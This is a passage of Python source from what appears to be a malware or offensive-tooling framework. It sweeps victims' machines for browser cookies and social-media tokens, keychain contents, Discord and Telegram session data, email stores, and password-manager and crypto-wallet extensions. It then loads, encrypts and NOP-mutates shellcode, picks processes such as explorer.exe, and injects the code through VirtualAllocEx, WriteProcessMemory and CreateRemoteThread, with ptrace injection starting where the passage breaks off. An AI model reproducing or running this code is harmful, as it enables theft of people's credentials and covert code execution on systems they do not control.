                    data.append({
                        'source': 'Safari History',
                        'entry_count': count,
                        'severity': 'high'
                    })
                    conn.close()
                except Exception as e:
                    self.logger.debug(f"Safari history: {e}")
            
            # ===== iCloud Keychain Status =====
            try:
                import subprocess
                result = subprocess.run(['security', 'dump-keychain'], 
                                      capture_output=True, text=True, timeout=5)
                if 'iCloud' in result.stdout:
                    data.append({
                        'source': 'iCloud Keychain',
                        'available': True,
                        'severity': 'critical'
                    })
            except Exception as e:
                self.logger.debug(f"iCloud keychain check: {e}")
            
        except Exception as e:
            self.logger.warning(f"Safari extraction failed: {e}")
        
        return data

    def _extract_social_media_credentials(self) -> List[dict]:
        """
        Extract social media credentials and tokens:
        - Facebook auth tokens and cookies
        - Twitter/X API keys and tokens
        - Instagram session cookies
        - LinkedIn session tokens
        - TikTok credentials
        - Discord tokens
        - Telegram session files
        - Reddit authentication
        
        Returns:
            List of dicts with extracted social media credentials
        """
        credentials = []
        try:
            import tempfile
            social_media_strings = {
                'facebook': ['fb_', 'fbsr_', 'fbx_'],
                'twitter': ['twitter', 'consumer_key', 'access_token'],
                'instagram': ['ig_', 'instagram'],
                'linkedin': ['linkedin', 'li_at', 'JSESSIONID'],
                'tiktok': ['tiktok', '__tea', 'passport'],
                'discord': ['discord', 'mfa.', 'nxo='],
                'reddit': ['reddit', 'reddit_session'],
                'youtube': ['youtube', 'APISID', 'HSID']
            }
            
            # ===== Browser Cookies for Social Media =====
            chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies")
            if os.path.isfile(chrome_path):
                try:
                    import sqlite3
                    import shutil
                    import tempfile
                    import tempfile as tmpfile_mod
                    
                    temp_db = os.path.join(tempfile.gettempdir(), f"cookies_{os.getpid()}.db")
                    shutil.copy2(chrome_path, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value FROM cookies")
                    
                    for host, name, value in cursor.fetchall():
                        for platform_name, keywords in social_media_strings.items():
                            if any(kw in name.lower() or kw in host.lower() for kw in keywords):
                                credentials.append({
                                    'source': f'{platform_name.title()} Credential',
                                    'platform': platform_name,
                                    'host': host,
                                    'cookie_name': name,
                                    'has_token': len(str(value)) > 20,
                                    'severity': 'critical'
                                })
                                break
                    
                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    self.logger.debug(f"Social media cookies extraction: {e}")
            
            # ===== Discord Token Detection =====
            try:
                discord_paths = [
                    os.path.expanduser("~\\AppData\\Roaming\\discord\\Cache"),
                    os.path.expanduser("~\\AppData\\Local\\Discord\\Cache"),
                ]
                
                for path in discord_paths:
                    if os.path.isdir(path):
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                if file.endswith(('.json', '.db', '.cache')):
                                    credentials.append({
                                        'source': 'Discord Cache',
                                        'location': os.path.join(root, file),
                                        'severity': 'high'
                                    })
            except Exception as e:
                self.logger.debug(f"Discord token search: {e}")
            
            # ===== Telegram Session Files =====
            telegram_session = os.path.expanduser("~\\AppData\\Roaming\\Telegram Desktop\\tdata")
            if os.path.isdir(telegram_session):
                credentials.append({
                    'source': 'Telegram Session',
                    'location': telegram_session,
                    'severity': 'critical'
                })
            
            self.logger.info(f"Social media credentials: {len(credentials)} items found")
        
        except Exception as e:
            self.logger.warning(f"Social media extraction failed: {e}")
        
        return credentials

    def _extract_email_credentials(self) -> List[dict]:
        """
        Extract email credentials and session tokens:
        - Outlook/Exchange credentials
        - Thunderbird email accounts
        - Gmail app authentication
        - Proton Mail credentials
        - Yahoo Mail session
        - Email sync account info
        - Email client stored passwords
        
        Returns:
            List of dicts with extracted email credentials
        """
        credentials = []
        try:
            # ===== Outlook/Exchange Credentials =====
            outlook_paths = [
                os.path.expanduser("~\\AppData\\Local\\Microsoft\\Outlook"),
                os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Outlook")
            ]
            
            for path in outlook_paths:
                if os.path.isdir(path):
                    try:
                        for file in os.listdir(path):
                            if file.endswith(('.pst', '.ost', '.xml')):
                                credentials.append({
                                    'source': 'Outlook Email Data',
                                    'file': os.path.join(path, file),
                                    'type': 'Email Vault',
                                    'severity': 'critical'
                                })
                    except Exception as e:
                        self.logger.debug(f"Outlook search: {e}")
            
            # ===== Thunderbird Email Accounts =====
            thunderbird_path = os.path.expanduser("~\\AppData\\Roaming\\Thunderbird\\Profiles")
            if os.path.isdir(thunderbird_path):
                try:
                    for profile in os.listdir(thunderbird_path):
                        profile_path = os.path.join(thunderbird_path, profile)
                        prefs_file = os.path.join(profile_path, "prefs.js")
                        
                        if os.path.isfile(prefs_file):
                            with open(prefs_file, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                if 'mail.identity' in content:
                                    credentials.append({
                                        'source': 'Thunderbird Email Config',
                                        'profile': profile,
                                        'location': prefs_file,
                                        'severity': 'high'
                                    })
                except Exception as e:
                    self.logger.debug(f"Thunderbird search: {e}")
            
            # ===== Gmail App Authentication =====
            gmail_app_paths = [
                os.path.expanduser("~\\AppData\\Local\\Google\\Gmail\\"),
                os.path.expanduser("~\\AppData\\Roaming\\Google\\Gmail\\")
            ]
            
            for path in gmail_app_paths:
                if os.path.isdir(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if 'auth' in file.lower() or file.endswith(('.json', '.db')):
                                credentials.append({
                                    'source': 'Gmail App Authentication',
                                    'location': os.path.join(root, file),
                                    'severity': 'critical'
                                })
            
            # ===== Email Sync Credentials =====
            email_sync_paths = [
                os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences"),
                os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences")
            ]
            
            for path in email_sync_paths:
                if os.path.isfile(path):
                    try:
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            if 'email' in content.lower() or 'mail' in content.lower():
                                credentials.append({
                                    'source': 'Browser Email Sync Config',
                                    'browser': os.path.dirname(path),
                                    'severity': 'medium'
                                })
                    except Exception as e:
                        self.logger.debug(f"Email sync config: {e}")
            
            self.logger.info(f"Email credentials: {len(credentials)} items found")
        
        except Exception as e:
            self.logger.warning(f"Email extraction failed: {e}")
        
        return credentials

    def _extract_browser_extensions_data(self) -> List[dict]:
        """
        Extract browser extension data and credentials:
        - Password manager extensions (1Password, LastPass, Dashlane)
        - Cryptocurrency wallet extensions
        - VPN extension credentials
        - Ad blockers and their data
        - Authentication extensions (Authy, etc.)
        - RSS readers and feeds
        - Tab session managers
        - Cookie managers
        
        Returns:
            List of dicts with extracted extension data
        """
        extensions_data = []
        try:
            # ===== Chrome/Edge Extensions =====
            browser_paths = [
                ("Chrome", os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions")),
                ("Edge", os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Extensions"))
            ]
            
            critical_extensions = {
                'lastpass': 'LastPass Password Manager',
                '1password': '1Password Vault',
                'dashlane': 'Dashlane Password Manager',
                'bitwarden': 'Bitwarden Password Manager',
                'metamask': 'MetaMask Crypto Wallet',
                'coinbase': 'Coinbase Wallet',
                'ledger': 'Ledger Wallet',
                'authy': 'Authy Authentication',
                'google authenticator': 'Google Authenticator',
                'vpn': 'VPN Extension',
                'nord': 'NordVPN',
                'expressvpn': 'ExpressVPN'
            }
            
            for browser_name, ext_path in browser_paths:
                if os.path.isdir(ext_path):
                    try:
                        for ext_id in os.listdir(ext_path):
                            ext_full_path = os.path.join(ext_path, ext_id)
                            if not os.path.isdir(ext_full_path):
                                continue
                            
                            # Check manifest.json for extension info
                            manifest_path = os.path.join(ext_full_path, "manifest.json")
                            if os.path.isfile(manifest_path):
                                try:
                                    with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        manifest = json.load(f)
                                        ext_name = manifest.get('name', 'Unknown Extension')
                                        
                                        # Check if it's a critical extension
                                        for keyword, friendly_name in critical_extensions.items():
                                            if keyword.lower() in ext_name.lower():
                                                extensions_data.append({
                                                    'source': f'{browser_name} Extension',
                                                    'name': friendly_name,
                                                    'extension_id': ext_id,
                                                    'path': ext_full_path,
                                                    'severity': 'critical'
                                                })
                                                self.logger.debug(f"Found critical extension: {friendly_name}")
                                                break
                                except:
                                    pass
                            
                            # Check for storage/data files in extensions
                            for root, dirs, files in os.walk(ext_full_path):
                                for file in files:
                                    if file.endswith(('.json', '.db', '.sqlite')):
                                        file_lower = file.lower()
                                        if any(kw in file_lower for kw in ['config', 'credential', 'password', 'token', 'wallet', 'auth']):
                                            extensions_data.append({
                                                'source': f'{browser_name} Extension Data',
                                                'extension_id': ext_id,
                                                'data_file': file,
                                                'location': os.path.join(root, file),
                                                'severity': 'high'
                                            })
                    except Exception as e:
                        self.logger.debug(f"{browser_name} extension scan: {e}")
            
            # ===== Brave Extensions =====
            brave_ext_path = os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions")
            if os.path.isdir(brave_ext_path):
                try:
                    for ext_id in os.listdir(brave_ext_path):
                        ext_full_path = os.path.join(brave_ext_path, ext_id)
                        if os.path.isdir(ext_full_path):
                            for root, dirs, files in os.walk(ext_full_path):
                                for file in files:
                                    if any(kw in file.lower() for kw in ['wallet', 'crypto', 'token', 'credential']):
                                        extensions_data.append({
                                            'source': 'Brave Extension Data',
                                            'extension_id': ext_id,
                                            'file': file,
                                            'severity': 'critical'
                                        })
                except Exception as e:
                    self.logger.debug(f"Brave extension scan: {e}")
            
            self.logger.info(f"Browser extensions: {len(extensions_data)} items found")
        
        except Exception as e:
            self.logger.warning(f"Browser extensions extraction failed: {e}")
        
        return extensions_data

    def load_shellcode(self, name: str, is_base64: bool = False, max_retries: int = 3) -> None:
        """
        Loads shellcode from BlackVault or base64-encoded string with retry logic for rate limits.
        
        Args:
            name: Artifact name in BlackVault or base64 string.
            is_base64: If True, treat name as base64-encoded shellcode.
            max_retries: Maximum retry attempts on rate limit errors.
        
        Raises:
            ValueError: If loading or decoding fails after retries.
        """
        import time
        with self.lock:
            retry_count = 0
            last_error = None
            
            while retry_count <= max_retries:
                try:
                    if is_base64:
                        self.shellcode = base64.b64decode(name)
                    else:
                        self.shellcode = self.vault.retrieve_for_ghostlayer(name)
                    attempt_msg = "" if retry_count == 0 else f" (attempt {retry_count + 1})"
                    self.logger.info(f"Loaded shellcode ({len(self.shellcode)} bytes){attempt_msg}")
                    return
                except ValueError as e:
                    # Check if this is a rate limit error
                    if "Rate limit" in str(e):
                        last_error = e
                        if retry_count < max_retries:
                            # Exponential backoff: 1s, 2s, 4s
                            backoff = 2 ** retry_count
                            self.logger.warning(f"Rate limit on shellcode load (attempt {retry_count + 1}/{max_retries}), waiting {backoff}s...")
                            time.sleep(backoff)
                            retry_count += 1
                            continue
                    # Non-rate-limit error, fail immediately
                    self.logger.error(f"Failed to load shellcode {name}: {e}")
                    raise ValueError(f"Shellcode load failed: {e}")
                except Exception as e:
                    self.logger.error(f"Failed to load shellcode {name}: {e}")
                    raise ValueError(f"Shellcode load failed: {e}")
            
            # All retries exhausted
            if last_error:
                self.logger.error(f"Shellcode load failed after {max_retries} retries: {last_error}")
                raise ValueError(f"Shellcode load failed after {max_retries} retries: {last_error}")

    def load_shellcode_from_bytes(self, shellcode: bytes) -> None:
        """
        Loads shellcode directly from raw bytes.
        
        Args:
            shellcode: Raw shellcode bytes to load.
        
        Raises:
            ValueError: If shellcode is empty or invalid.
        """
        with self.lock:
            if not shellcode or not isinstance(shellcode, bytes):
                self.logger.error("Invalid shellcode data: must be non-empty bytes")
                raise ValueError("Shellcode must be non-empty bytes")
            try:
                self._validate_shellcode(shellcode)
                self.shellcode = shellcode
                self.logger.info(f"Loaded shellcode from bytes ({len(self.shellcode)} bytes)")
            except Exception as e:
                self.logger.error(f"Failed to load shellcode from bytes: {e}")
                raise ValueError(f"Shellcode load failed: {e}")

    def encrypt_shellcode(self) -> bytes:
        """
        Encrypts shellcode using BlackVault.
        
        Returns:
            bytes: Encrypted shellcode (IV + ciphertext + HMAC).
        
        Raises:
            ValueError: If shellcode is empty or encryption fails.
        """
        with self.lock:
            if not self.shellcode:
                self.logger.error("No shellcode loaded for encryption")
                raise ValueError("No shellcode loaded")
            try:
                encrypted = self.vault._encrypt(self.shellcode)
                self.logger.info("Shellcode encrypted")
                return encrypted
            except Exception as e:
                self.logger.error(f"Shellcode encryption failed: {e}")
                raise ValueError(f"Encryption failed: {e}")

    def decrypt_shellcode(self, encrypted_data: bytes) -> bytes:
        """
        Decrypts shellcode using BlackVault.
        
        Args:
            encrypted_data: Encrypted shellcode (IV + ciphertext + HMAC).
        
        Returns:
            bytes: Decrypted shellcode.
        
        Raises:
            ValueError: If decryption or HMAC validation fails.
        """
        try:
            decrypted = self.vault._decrypt(encrypted_data)
            self.logger.info("Shellcode decrypted")
            return decrypted
        except Exception as e:
            self.logger.error(f"Shellcode decryption failed: {e}")
            raise ValueError(f"Decryption failed: {e}")

    def mutate_shellcode(self) -> None:
        """
        Mutates shellcode by inserting random NOPs.
        
        Raises:
            ValueError: If shellcode is empty or mutation fails.
        """
        with self.lock:
            if not self.shellcode:
                self.logger.error("No shellcode loaded for mutation")
                raise ValueError("No shellcode loaded")
            try:
                mutated = bytearray(self.shellcode)
                for _ in range(random.randint(1, 5)):
                    pos = random.randint(0, len(mutated) - 1)
                    mutated.insert(pos, 0x90)
                self.shellcode = bytes(mutated)
                self.logger.info(f"Shellcode mutated to {len(self.shellcode)} bytes")
            except Exception as e:
                self.logger.error(f"Shellcode mutation failed: {e}")
                raise ValueError(f"Mutation failed: {e}")

    def extract_secrets(self, html: str = "") -> List[str]:
        """
        Extracts potential secrets (API keys, tokens, passwords) from HTML content.
        
        Uses regex patterns to detect:
        - API keys and access tokens
        - Secret keys and private keys
        - Authorization headers
        - Passwords and credentials
        
        Args:
            html: HTML/JavaScript content to scan (uses recon_data if not provided).
        
        Returns:
            List[str]: Detected secrets (deduplicated).
        
        Raises:
            ValueError: If HTML parsing fails.
        """
        try:
            content = html if html else (self.recon_data.get('html', '') if self.recon_data else '')
            if not content:
                self.logger.warning("No HTML content provided for secret extraction")
                return []
            
            # Call the module-level extraction function
            secrets = extract_secrets(content)  # type: ignore
            if secrets:
                self.logger.info(f"Extracted {len(secrets)} potential secrets")
                # Store in vault for later analysis
                self.vault.store(
                    f"extracted_secrets_{time.time()}",
                    json.dumps(list(secrets)).encode()
                )
            return list(secrets)
        except Exception as e:
            self.logger.error(f"Secret extraction failed: {e}")
            raise ValueError(f"Secret extraction failed: {e}")

    def fingerprint_tech(self, html: str = "", headers: Optional[Dict] = None) -> List[str]:
        """
        Fingerprints web technologies from HTTP headers and HTML content.
        
        Detects:
        - Web servers (Apache, Nginx, IIS, Tomcat)
        - Web frameworks (Django, Flask, Laravel, Rails)
        - CMS platforms (WordPress, Drupal, Joomla)
        - JavaScript frameworks (React, Angular, Vue)
        - Programming languages and libraries
        
        Args:
            html: HTML content to analyze or first positional arg.
            headers: HTTP response headers (dict). Uses recon data if not provided.
        
        Returns:
            List[str]: Detected technologies (deduplicated).
        
        Raises:
            ValueError: If fingerprinting fails.
        """
        try:
            content = html if html else (self.recon_data.get('html', '') if self.recon_data else '')
            resp_headers = headers if headers else (self.recon_data.get('headers', {}) if self.recon_data else {})
            
            if not content and not resp_headers:
                self.logger.warning("No headers/HTML provided for tech fingerprinting")
                return []
            
            # Call the module-level fingerprinting function
            technologies = fingerprint_tech(resp_headers, content)  # type: ignore
            if technologies:
                self.logger.info(f"Fingerprinted {len(technologies)} technologies")
                # Store in vault for later analysis
                self.vault.store(
                    f"fingerprinted_tech_{time.time()}",
                    json.dumps(list(technologies)).encode()
                )
            return list(technologies)
        except Exception as e:
            self.logger.error(f"Technology fingerprinting failed: {e}")
            raise ValueError(f"Fingerprinting failed: {e}")

    def find_target_process(self) -> int:
        """
        Finds a suitable target process for injection.
        
        Returns:
            int: Process ID.
        
        Raises:
            RuntimeError: If no suitable process is found.
        """
        preferred = ["notepad.exe", "explorer.exe", "python.exe"]
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and proc.info['name'].lower() in preferred:
                    self.logger.info(f"Found target: {proc.info['name']} (PID {proc.info['pid']})")
                    return proc.info['pid']
            raise RuntimeError("No suitable process found")
        except Exception as e:
            self.logger.error(f"Failed to find target process: {e}")
            raise RuntimeError(f"Target process search failed: {e}")

    def _has_sedebug_privilege(self) -> bool:
        """Check if process has SeDebugPrivilege on Windows (requires elevation)."""
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            # Try to open system process (PID 4) which requires SeDebugPrivilege
            h_process = kernel32.OpenProcess(0x0400, False, 4)
            if h_process:
                kernel32.CloseHandle(h_process)
                self.logger.debug("SeDebugPrivilege check: PASSED")
                return True
            else:
                self.logger.debug("SeDebugPrivilege check: FAILED")
                return False
        except Exception as e:
            self.logger.debug(f"SeDebugPrivilege check error: {e}")
            return False
    
    def _has_ptrace_capability(self) -> bool:
        """Check if process has ptrace capabilities on Linux."""
        try:
            with open('/proc/self/status', 'r') as f:
                for line in f:
                    if 'CapEff:' in line:
                        caps = int(line.split(':')[1].strip(), 16)
                        has_ptrace = bool(caps & (1 << 19))
                        self.logger.debug(f"ptrace capability check: {'PASSED' if has_ptrace else 'FAILED'}")
                        return has_ptrace
            return False
        except Exception as e:
            self.logger.debug(f"ptrace capability check error: {e}")
            return False

    def _calculate_entropy(self, data: bytes) -> float:
        """
        Calculate Shannon entropy of shellcode to detect plaintext.
        
        Entropy scale:
        - 0.0-3.0: Low entropy (likely plaintext or padding)
        - 3.0-4.5: Medium entropy (possibly compressed or partially encrypted)
        - 4.5-8.0: High entropy (likely binary or encrypted)
        
        Args:
            data: Bytes to analyze.
        
        Returns:
            float: Entropy value (0.0-8.0).
        """
        if not data:
            return 0.0
        
        import math
        
        # Calculate byte frequency distribution
        frequencies = {}
        for byte in data:
            frequencies[byte] = frequencies.get(byte, 0) + 1
        
        # Calculate Shannon entropy
        entropy = 0.0
        data_len = len(data)
        for count in frequencies.values():
            probability = count / data_len
            entropy -= probability * math.log2(probability) if probability > 0 else 0
        
        return entropy

    def _validate_shellcode(self, shellcode: bytes) -> bool:
        """
        Validate shellcode before injection.
        
        Checks:
        - Binary content (entropy > 4.5 for encrypted/binary)
        - Known shellcode entry patterns (x86/ARM64)
        - Reasonable size (>=3 bytes for testing, <512KB for production)
        - Not low-entropy plaintext disguised as binary
        
        Returns:
            bool: True if shellcode appears valid, False otherwise.
        
        Raises:
            ValueError: If validation fails with specific reason.
        """
        if not shellcode or len(shellcode) < 3:
            self.logger.error("Shellcode validation failed: too small")
            raise ValueError("shellcode_too_small")
        
        if len(shellcode) > 512 * 1024:  # 512KB limit
            self.logger.error("Shellcode validation failed: too large")
            raise ValueError("shellcode_too_large")
        
        # Calculate entropy
        entropy = self._calculate_entropy(shellcode)
        
        # Check for common shellcode entry patterns
        valid_patterns = [
            b'\x55\x89\xe5',      # x86-64: push rbp; mov rbp, rsp
            b'\x48\x89\xe5',      # x86-64: mov rbp, rsp
            b'\x90' * 4,          # NOPs (padding)
            b'\xeb',              # jmp (common entry)
            b'\xcc',              # int3 (breakpoint)
            b'\x50',              # x86: push rax
            b'\x55',              # push rbp
        ]
        
        found_pattern = any(shellcode.startswith(pat) for pat in valid_patterns)
        
        if found_pattern:
            self.logger.debug(f"Shellcode validation passed: recognized pattern (entropy={entropy:.2f})")
            return True
        
        # If no known pattern, check entropy and plaintext
        if entropy < 4.5:
            # Low entropy might indicate plaintext
            try:
                plaintext = shellcode.decode('ascii', errors='strict')
                # If we get here, it's definitely plaintext
                self.logger.error(f"Shellcode validation failed: low_entropy_plaintext (entropy={entropy:.2f})")
                raise ValueError("low_entropy_plaintext")
            except (UnicodeDecodeError, AttributeError):
                # Binary data with low entropy (might be compressed)
                self.logger.warning(f"Shellcode validation: low entropy detected (entropy={entropy:.2f}), but appears to be valid binary")
                return True
        else:
            # Medium to high entropy, likely valid binary/encrypted
            self.logger.debug(f"Shellcode validation passed: high entropy binary (entropy={entropy:.2f})")
            return True
    
    def _safe_open_process(self, pid: int) -> int:
        """
        Safely open process handle with detailed error reporting.
        
        Attempts to open with PROCESS_ALL_ACCESS first, then falls back to
        limited rights (QUERY_INFORMATION) to diagnose the exact failure reason.
        
        Args:
            pid: Target process ID.
            
        Returns:
            int: Process handle if successful.
            
        Raises:
            RuntimeError: With detailed diagnostic message explaining why access failed.
        """
        kernel32 = ctypes.windll.kernel32
        PROCESS_ALL_ACCESS = 0x1F0FFF
        PROCESS_QUERY_INFORMATION = 0x0400
        
        # First attempt: Try full access
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if h_process:
            self.logger.debug(f"Successfully opened PID {pid} with PROCESS_ALL_ACCESS")
            return h_process
        
        # Second attempt: Try limited access to diagnose the issue
        h_process_limited = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
        if h_process_limited:
            kernel32.CloseHandle(h_process_limited)
            # Process is accessible with limited rights, but not with full rights
            error_msg = (
                f"PID {pid}: Process exists but PROCESS_ALL_ACCESS denied.\n"
                f"  - Process may be system-protected (svchost, ntoskrnl, etc.)\n"
                f"  - Process may be elevated (running as Administrator)\n"
                f"  - Process may be 32/64-bit mismatch\n"
                f"  Solution: Verify you have SeDebugPrivilege (run as Administrator)\n"
                f"  or target a different process owned by your user account."
            )
            self.logger.error(error_msg)
            raise RuntimeError(error_msg)
        else:
            # Complete access denied - process likely doesn't exist or is inaccessible
            error_msg = (
                f"PID {pid}: Complete access denied.\n"
                f"  - Verify PID exists (check Task Manager)\n"
                f"  - Verify process is not terminating\n"
                f"  - Verify you have permissions for this process owner\n"
                f"  - Try running as Administrator if current user doesn't own the process."
            )
            self.logger.error(error_msg)
            raise RuntimeError(error_msg)
    
    def _get_process_architecture(self, pid: int) -> str:
        """
        Determine if target process is 32-bit or 64-bit.
        
        On Windows, checks if process is running under WoW64 (32-bit on 64-bit OS).
        
        Args:
            pid: Target process ID.
            
        Returns:
            str: Either '32-bit' or '64-bit'.
            
        Raises:
            RuntimeError: If architecture cannot be determined.
        """
        try:
            import struct
            kernel32 = ctypes.windll.kernel32
            is_wow64 = ctypes.c_bool()
            
            h_process = self._safe_open_process(pid)
            try:
                result = kernel32.IsWow64Process(h_process, ctypes.byref(is_wow64))
                if not result:
                    # If IsWow64Process fails, assume 64-bit
                    return '64-bit'
                
                if is_wow64.value:
                    return '32-bit'  # 32-bit process on 64-bit OS
                else:
                    # Need to check if OS is 64-bit to determine actual architecture
                    is_os_64 = ctypes.c_bool()
                    kernel32.IsWow64Process(ctypes.windll.kernel32.GetCurrentProcess(), 
                                          ctypes.byref(is_os_64))
                    return '64-bit' if is_os_64.value else '32-bit'
            finally:
                kernel32.CloseHandle(h_process)
        except Exception as e:
            self.logger.warning(f"Could not determine architecture for PID {pid}: {e}")
            return '64-bit'  # Default assumption
    
    def _verify_remote_memory_write(self, h_process: int, addr: int, expected_data: bytes) -> bool:
        """
        Verify that shellcode was written correctly by reading it back.
        
        Args:
            h_process: Process handle.
            addr: Remote address where data was written.
            expected_data: Expected data bytes.
            
        Returns:
            bool: True if verification succeeds.
            
        Raises:
            RuntimeError: If verification fails.
        """
        try:
            kernel32 = ctypes.windll.kernel32
            read_buffer = ctypes.create_string_buffer(len(expected_data))
            bytes_read = ctypes.c_size_t(0)
            
            read_result = kernel32.ReadProcessMemory(h_process, addr, read_buffer,
                                                    len(expected_data), 
                                                    ctypes.byref(bytes_read))
            
            if not read_result or bytes_read.value != len(expected_data):
                raise RuntimeError(
                    f"Failed to read verification data: "
                    f"read_result={read_result}, bytes_read={bytes_read.value}/{len(expected_data)}"
                )
            
            if read_buffer.raw != expected_data:
                # Calculate how many bytes match from the start
                matching = 0
                for i, (a, b) in enumerate(zip(read_buffer.raw, expected_data)):
                    if a == b:
                        matching += 1
                    else:
                        break
                
                raise RuntimeError(
                    f"Shellcode verification failed: Only {matching}/{len(expected_data)} bytes match. "
                    f"Possible causes: memory corruption, access denied, or address already cleaned."
                )
            
            self.logger.debug(f"Shellcode verification passed: {len(expected_data)} bytes verified")
            return True
        except Exception as e:
            self.logger.error(f"Memory write verification failed: {e}")
            raise RuntimeError(f"Verification failed: {e}")
    
    def _inject_into_pid_windows(self, pid: int, shellcode: bytes) -> bool:
        """
        Windows process injection with full error recovery and validation.
        
        Implementation checklist:
        ✅ SeDebugPrivilege check pre-flight
        ✅ Shellcode validation
        ✅ Process architecture detection
        ✅ Process handle with cleanup guarantees
        ✅ Memory allocation with validation
        ✅ Shellcode write with verification
        ✅ Remote thread creation with diagnostics
        ✅ Comprehensive error handling
        
        Args:
            pid: Target process ID.
            shellcode: Decrypted shellcode binary.
            
        Returns:
            bool: True if injection successful.
            
        Raises:
            RuntimeError: With detailed diagnostic on failure.
        """
        MEM_COMMIT_RESERVE = 0x3000
        PAGE_EXECUTE_READWRITE = 0x40
        kernel32 = ctypes.windll.kernel32
        
        # Get target architecture for diagnostics
        arch = self._get_process_architecture(pid)
        self.logger.info(f"Target process architecture: {arch}")
        
        # Open process with safe handle management
        h_process = self._safe_open_process(pid)
        
        try:
            # Allocate memory for shellcode
            addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode), 
                                         MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
            if not addr:
                raise RuntimeError(
                    f"Memory allocation failed for {len(shellcode)} bytes. "
                    f"Possible causes: insufficient memory, process memory quota exceeded, "
                    f"or protection settings preventing allocation."
                )
            
            self.logger.debug(f"Allocated {len(shellcode)} bytes at 0x{addr:X}")
            
            # Write shellcode to allocated memory
            written = ctypes.c_size_t(0)
            write_result = kernel32.WriteProcessMemory(h_process, addr, shellcode, 
                                                 len(shellcode), ctypes.byref(written))
            
            if not write_result:
                kernel32.VirtualFreeEx(h_process, addr, 0, 0x8000)  # MEM_RELEASE
                raise RuntimeError(
                    f"Shellcode write failed completely. "
                    f"Possible causes: target process exited, memory not writable, or access denied."
                )
            
            if written.value != len(shellcode):
                kernel32.VirtualFreeEx(h_process, addr, 0, 0x8000)
                raise RuntimeError(
                    f"Incomplete write: only {written.value}/{len(shellcode)} bytes written. "
                    f"Possible causes: memory access violation, process quota exceeded, or target process terminating."
                )
            
            self.logger.debug(f"Successfully wrote {written.value} bytes to 0x{addr:X}")
            
            # Verify the write
            self._verify_remote_memory_write(h_process, addr, shellcode)
            
            # Create remote thread to execute shellcode
            thread_id = wintypes.DWORD(0)
            thread_result = kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 
                                                 0, ctypes.byref(thread_id))
            
            if not thread_result:
                kernel32.VirtualFreeEx(h_process, addr, 0, 0x8000)
                raise RuntimeError(
                    f"Remote thread creation failed. Likely causes:\n"
                    f"  - Process architecture mismatch (32/64-bit): Target is {arch}\n"
                    f"  - Target process architecture incompatible with shellcode\n"
                    f"  - Process has restrictions (protected/system)\n"
                    f"  Solution: Verify shellcode architecture matches target process"
                )
            
            self.logger.info(
                f"Windows injection successful: PID {pid}, "
                f"shellcode@0x{addr:X}, thread_id={thread_id.value}, arch={arch}"
            )
            return True
            
        except Exception as e:
            self.logger.error(f"Windows injection failed: {e}")
            raise RuntimeError(f"Windows injection failed: {e}")
        finally:
            # Ensure handle is closed
            if h_process:
                kernel32.CloseHandle(h_process)
    
    def _parse_proc_maps(self, pid: int) -> dict:
        """
        Parse /proc/[pid]/maps to extract memory regions and find libc base address.
        
        Useful for ASLR bypass and finding entry points.
        
        Args:
            pid: Target process ID.
            
        Returns:
            dict: Contains 'libc_base', 'libc_end', 'heap_start', and full 'regions' list.
            
        Raises:
            RuntimeError: If map cannot be read.
        """
        try:
            maps = {}
            regions = []
            
            with open(f'/proc/{pid}/maps', 'r') as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) < 6:
                        continue
                    
                    addr_range = parts[0]
                    perms = parts[1]
                    mapping = parts[5] if len(parts) > 5 else ''
                    
                    try:
                        start, end = addr_range.split('-')
                        start = int(start, 16)
                        end = int(end, 16)
                    except ValueError:
                        continue
                    
                    region = {
                        'start': start,
                        'end': end,
                        'perms': perms,
                        'mapping': mapping,
                        'size': end - start
                    }
                    regions.append(region)
                    
                    if 'libc' in mapping and 'libc_base' not in maps:
                        maps['libc_base'] = start
                        maps['libc_end'] = end
                    elif mapping.startswith('[heap') and 'heap_start' not in maps:
                        maps['heap_start'] = start
                    elif mapping.startswith('[stack') and 'stack_start' not in maps:
                        maps['stack_start'] = start
            
            maps['regions'] = regions
            self.logger.debug(f"Parsed {len(regions)} memory regions for PID {pid}")
            if 'libc_base' in maps:
                self.logger.debug(f"Found libc at 0x{maps['libc_base']:X}")
            return maps
        except Exception as e:
            self.logger.warning(f"Failed to parse /proc/{pid}/maps: {e}")
            raise RuntimeError(f"Cannot read process memory map: {e}")
    
    def _inject_via_ptrace(self, pid: int, shellcode: bytes) -> bool:
        """
        Inject shellcode using ptrace (most reliable on Linux).
        
        Requires: CAP_SYS_PTRACE capability (root or elevated).
        
        Strategy:
        1. PTRACE_ATTACH to target process
        2. Parse /proc/[pid]/maps for entry point
        3. PTRACE_POKETEXT to write shellcode
        4. PTRACE_SETREGS to set RIP/EIP to shellcode
        5. PTRACE_CONT to resume execution
        
        Args:
            pid: Target process ID.
            shellcode: Shellcode bytes to inject.
            
        Returns:
            bool: True if injection successful.
            
        Raises:
            RuntimeError: If ptrace attach fails or write fails.
        """
        if platform.system() != 'Linux':
            raise RuntimeError("ptrace injection only supported on Linux")
        
        try:
            libc = ctypes.CDLL('libc.so.6')
            
            # PTRACE constants
            PTRACE_ATTACH = 16
